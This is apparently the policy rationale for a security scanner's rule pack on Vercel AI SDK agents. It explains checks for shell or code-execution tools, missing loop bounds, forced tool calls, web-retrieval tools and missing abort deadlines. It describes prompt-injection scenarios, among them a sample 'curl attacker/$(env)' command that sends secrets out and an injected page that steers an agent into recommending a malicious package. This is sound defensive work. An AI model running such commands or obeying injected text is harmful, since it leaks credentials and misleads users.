---
policy_id: vercel_ai_agent_safety
category: vercel_ai
topic: agent_safety
rules:
  - id: VAI-006
    severity: high
    confidence: 0.85
    scope: agent
    fix_type: config
  - id: VAI-007
    severity: low
    confidence: 0.6
    scope: agent
    fix_type: config
  - id: VAI-008
    severity: medium
    confidence: 0.65
    scope: agent
    fix_type: config
  - id: VAI-009
    severity: medium
    confidence: 0.7
    scope: agent
    fix_type: config
  - id: VAI-020
    severity: low
    confidence: 0.5
    scope: agent
    fix_type: config
references: [LLM06, LLM10, LLM01]
---

# Policy Rationale: Vercel AI SDK Agent Safety

**Policy ID:** `vercel_ai_agent_safety`  
**File:** `vercel_ai/agent_safety.yaml`  
**Rules:** VAI-006, VAI-007, VAI-008, VAI-009, VAI-020  
**Severities:** high, low, medium, medium, low  
**Fix types:** config, config, config, config, config  
**References:** LLM06 (Excessive Agency), LLM10 (Unbounded Consumption), LLM01 (Prompt Injection)

---

## What this policy covers

Agent-scope rules for Vercel AI SDK agents — the `generateText` / `streamText` /
`generateObject` / `streamObject` tool-loop calls and the `ToolLoopAgent` class
(normalized `vercel_ai_agent`). **VAI-006** fires when the agent's `tools` record
includes a provider execution or file-editing tool — anthropic's `bash` /
`computer` / `textEditor` / `codeExecution`, openai's `localShell` /
`computerUsePreview` / `codeInterpreter`, or google's `codeExecution` (predicate
`agent_uses_hosted_tool_class`). **VAI-007** fires when the agent sets neither
`stopWhen` nor `maxSteps` (predicate `agent_kwarg_missing` for both). **VAI-008**
fires when `toolChoice: "required"` is combined with one of those provider
execution tools (predicates `agent_kwarg_value` + `agent_uses_hosted_tool_class`).
**VAI-009** fires when the agent wires a provider tool that retrieves
model-chosen web content — anthropic's `webSearch`, openai's `webSearch` /
`webSearchPreview`, or google's `googleSearch` / `urlContext` (predicate
`agent_uses_hosted_tool_class`).

---

## Why agent configuration is a distinct concern in the Vercel AI SDK

The Vercel AI SDK ships and markets provider execution tools as first-class:
wiring anthropic's `bash`, openai's `localShell`, or google's `codeExecution` is a
single line that hands a model-driven loop direct shell, computer-control, or
code-interpreter reach on the host or provider sandbox. Because the agent's
prompts and prior tool outputs are model-reachable, a prompt injection has a
direct path to running attacker-chosen commands or code with the agent's
privileges (VAI-006). This is excessive agency (LLM06) in its most literal form —
the agent is one wired tool away from arbitrary execution.

The loop bounds matter because the default ceiling is generic, not task-sized. A
bare `generateText` / `streamText` call does not continue the tool loop without
`stopWhen`, and the `Agent` / `ToolLoopAgent` class defaults to
`stopWhen: stepCountIs(20)` — so an agent that omits an explicit bound (VAI-007)
either silently does not iterate or inherits that generic 20-step ceiling. A
prompt injection — or a model that loops on a tool whose output keeps
re-triggering it — can then run up to that default before stopping, burning
tokens, hammering every wired tool (including billed or side-effecting ones), and
stalling the request (LLM10). VAI-008 is the interaction of the two: setting
`toolChoice: "required"` forces a tool call on every step instead of letting the
model answer directly, so a wired execution tool is far more likely to be invoked
— and invoked on a step the model had no real need for it. Forcing a call narrows
the model's options toward exactly the capability you least want it reaching for.

---

## Rule-by-rule defense

### VAI-006 — Agent wires a provider shell / computer / file-editing / code-execution tool (Severity: high, Confidence: 0.85, Fix type: config)

**What we detect:** an agent whose `tools` record includes a provider execution
or file-editing tool (anthropic `bash`/`computer`/`textEditor`/`codeExecution`,
openai `localShell`/`computerUsePreview`/`codeInterpreter`, google
`codeExecution`) — predicate `agent_uses_hosted_tool_class`. `textEditor` is
matched alongside the execution tools because a model-driven file editor reaches
the same outcome one step removed: writing attacker-chosen content to a file that
is later executed, imported, or trusted.

**Why it is flaggable:** these provider tools give the model shell, full computer
control, host file editing, or a code interpreter. Once one is on the tool
surface, a prompt injection or a confused model has a direct path to arbitrary
execution or file mutation with the agent's privileges. The capability is the
defect.

**Real-world consequence:** an agent built to "triage logs" wires
`anthropic.tools.bash`; a crafted log line is interpreted as an instruction and
the model runs `curl attacker/$(env)`, exfiltrating the deployment's secrets.

**Why severity is high and not critical:** the engine reserves critical for
exposures with no precondition; here a successful attack requires the tool to be
wired and the prompt surface to be reachable by untrusted input, and many
provider tools execute in a provider-managed sandbox rather than directly on the
host — high reflects a serious, conditional execution path. **Fix type —
config:** the fix is removing the tool from the agent's `tools` record, an
agent-wiring change, not a tool-source edit. **Confidence 0.85:** a few agents
legitimately need an execution tool and sandbox it out of band, which the
class-name match cannot see.

### VAI-007 — Agent tool loop has no explicit step bound (Severity: low, Confidence: 0.6, Fix type: config)

**What we detect:** an agent that runs a tool loop but sets neither `stopWhen`
nor `maxSteps` (predicate `agent_kwarg_missing` for both).

**Why it is flaggable:** absent an explicit bound the loop runs to the SDK's
generic default (a single step for a bare call, or `stepCountIs(20)` for the
`Agent` class) rather than a task-sized cap; an injection or a self-re-triggering
tool can run it up to that ceiling (LLM10).

**Real-world consequence:** a research agent loops on a search tool whose results
keep prompting another search; with no `maxSteps` it runs hundreds of round-trips,
burning the token budget and hammering the search API before the request times
out.

**Why severity is low:** the SDK already bounds the loop by default, so this flags
a missing *explicit, task-sized* cap rather than a true runaway — a hygiene nudge
whose usual worst case is a cost/availability incident, and only a safety problem
when the looped tools have side effects. **Fix type — config:** pass `maxSteps` or a
`stopWhen` condition. **Confidence 0.6:** the SDK has multiple evolving stop
mechanisms (`maxSteps`, `stopWhen`, `stepCountIs`, version differences between v4
and v5), and an agent bounded by an external timeout or a custom loop guard is
over-flagged — the breadth of legitimate alternatives is why confidence sits at
0.6.

### VAI-008 — Agent forces a provider execution tool every step (Severity: medium, Confidence: 0.65, Fix type: config)

**What we detect:** an agent with `toolChoice: "required"` AND a wired provider
execution tool (predicates `agent_kwarg_value` + `agent_uses_hosted_tool_class`).

**Why it is flaggable:** `"required"` forces the model to call a tool on every
step, so the high-risk execution tool is more likely to be invoked — and on a step
it was not needed. Forcing a call narrows the model toward the most dangerous
capability available.

**Real-world consequence:** an agent with `toolChoice: "required"` and
`openai.tools.localShell` wired is pushed to call the shell even on a step where a
plain text answer would do, widening the window for an injected command to land.

**Why severity is medium and not high:** it is an amplifier of VAI-006's
underlying risk rather than a fresh execution path — the danger is the *increased
likelihood* of invoking the wired tool, conditional on that tool already being
present. **Fix type — config:** switch to `toolChoice: "auto"` or pin to a safe
tool, a constructor change. **Confidence 0.65:** `toolChoice: "required"` is a
legitimate pattern when every wired tool is safe, so the rule over-flags agents
that force a call but whose only "execution" tool is in a hardened sandbox.

### VAI-009 — Agent wires a provider tool that retrieves model-chosen web content (Severity: medium, Confidence: 0.7, Fix type: config)

**What we detect:** an agent whose `tools` record includes a provider
web-retrieval tool — anthropic `webSearch`, openai `webSearch` /
`webSearchPreview`, google `googleSearch` / `urlContext` (predicate
`agent_uses_hosted_tool_class`). These classes were already in discovery's
recognized provider-tool set but had no rule; before this, vercel_ai was the only
pack with no model-driven-fetch check while the equivalent grants fired in the
OpenAI (OAI-109), ADK (ADK-105), CrewAI (CREW-107), and Pydantic AI (PYD-103)
packs.

**Why it is flaggable:** the model controls the query or URL, so an injected
instruction can steer retrieval toward attacker-published pages, and the query
string is itself an exfiltration channel for in-context data. The retrieved
content re-enters the conversation as untrusted text — a second-order
prompt-injection channel (LLM01) from whatever site the model was steered to.
`urlContext` is the sharpest case: it fetches model-supplied URLs directly.

**Real-world consequence:** a support agent with `anthropic.tools.webSearch` is
injected to search for a term whose top result is attacker-published; the page
instructs the agent to recommend a malicious package, and the recommendation
flows to the user as the agent's own answer.

**Why severity is medium and not high:** retrieval has no write or execution
reach of its own — the harm needs a second step (the injected content steering a
side-effecting tool or the user). Matches the medium calibration of CREW-107 and
PYD-103 for the same surface.

**Fix type — config:** remove the provider retrieval tool from the `tools`
record, or keep it and treat its output as untrusted — an agent-wiring change.

**Confidence 0.7:** the class-name match is unambiguous, but search results are
provider-mediated snippets on some providers (narrower injection surface than a
raw fetch), and agents that genuinely need open web access with output checks in
place are over-flagged.

### VAI-020 — Agent tool loop has no abortSignal deadline (Severity: low, Confidence: 0.5, Fix type: config)

**What we detect:**
A `generateText` / `streamText` call (`agent_class: [GenerateText, StreamText]`)
that runs a bounded tool loop (`agent_kwarg_present: [stopWhen, maxSteps]`) but
passes no `abortSignal` (`agent_kwarg_missing`). `ToolLoopAgent` is excluded: its
signal is supplied on `.generate()` / `.stream()`, not on the constructor, so a
constructor-level check would flag every correctly-cancelled agent.

**Why it is flaggable:**
The step bound (VAI-007) limits how many round-trips happen, not how long they take.
One step that waits on a slow tool or a stalled provider response holds the request
open with no deadline, and a client that disconnects cannot cancel the work, so the
loop keeps its tools live and keeps spending tokens (LLM10, Unbounded Consumption).

**Real-world consequence:**
A route handler runs a five-step tool loop; a tool step stalls on an upstream API,
the user closes the tab, and with no signal forwarded the serverless invocation runs
to the platform's hard limit, billed the whole time.

**Why severity is low and not medium:**
Availability and cost only, bounded by the platform's own invocation limit, and
nothing new is granted to the model. Same tier as VAI-007.

**Fix type — config:**
One option on the call.

**Confidence 0.5:**
The lowest in the file, on purpose. **False positives:** a deadline enforced
outside the call (a platform timeout, `Promise.race`, a wrapper that aborts on the
caller's behalf) is invisible; `abortSignal` passed through a spread is not read;
`stopWhen` and `maxSteps` are only a proxy for "this call loops", so a call whose
tools never run long is flagged for something with little wall-clock risk.
**False negatives:** the check is presence-only, so a signal that never aborts
satisfies it; `ToolLoopAgent` and calls with no explicit loop bound are silent.

---

## What this policy does not cover

- Code execution implemented by hand inside a tool's `execute()` body rather than
  via a provider tool — caught by **VAI-002** (code_execution.md) and **VAI-001**
  (shell_safety.md), not here.
- Hand-rolled fetch of a model-supplied URL inside a tool body — caught by
  **VAI-003** (ssrf.md), not here; VAI-009 covers only the provider-shipped
  retrieval tools.
- `openai.tools.fileSearch` (vector-store retrieval over previously uploaded
  files) is recognized by discovery but deliberately not matched — its corpus is
  operator-supplied, not the open web, so the model cannot steer it toward
  attacker-published content the way it can a web search.
- Whether the agent's prompt surface is actually reachable by untrusted content —
  all four rules flag a configuration, not a proven injection path.
- A provider execution tool referenced under an alias or constructed indirectly,
  or a provider/tool name outside the listed set, may escape the
  class-name match.
- Loop bounds enforced outside the call (an external timeout, an
  `AbortController`, a custom step handler) are invisible to VAI-007.
- Whether a provider tool's sandbox is actually isolated — VAI-006/008 flag the
  wiring regardless of the provider's execution environment.
- For VAI-020: deadlines enforced outside the call (platform timeouts,
  `Promise.race`, a wrapping helper), a signal passed via a spread, and
  `ToolLoopAgent` (the signal goes on `.generate()`, which the constructor-level
  read cannot see).

---

## Recommendations beyond the fix

```typescript
import { generateText, stepCountIs } from "ai";

// No provider execution tool; an explicit step bound; default toolChoice.
const result = await generateText({
  model,
  tools: { lookupOrder, searchDocs },   // no bash/computer/codeExecution
  stopWhen: stepCountIs(8),             // bounded loop
  // toolChoice defaults to "auto" — the model calls a tool only when needed
  prompt,
});
```

1. Drop provider shell / computer / code-execution tools unless the workflow
   truly requires one. If essential, run it against an isolated, ephemeral
   sandbox with no credentials, no private-network reach, and a hard timeout;
   constrain which commands or code may run; and gate every invocation behind
   explicit human approval.
2. Always set an explicit bound — `maxSteps` or a `stopWhen` condition
   (`stepCountIs(n)`) — sized to the lowest the workflow tolerates so a
   misbehaving loop fails fast.
3. Leave `toolChoice` at `"auto"` so the model calls an execution tool only when
   the task needs it; pin to a specific *safe* tool when a call is genuinely
   mandatory.
4. Treat prior tool output and retrieved content as untrusted — they are the
   model-reachable surface a prompt injection rides in on.
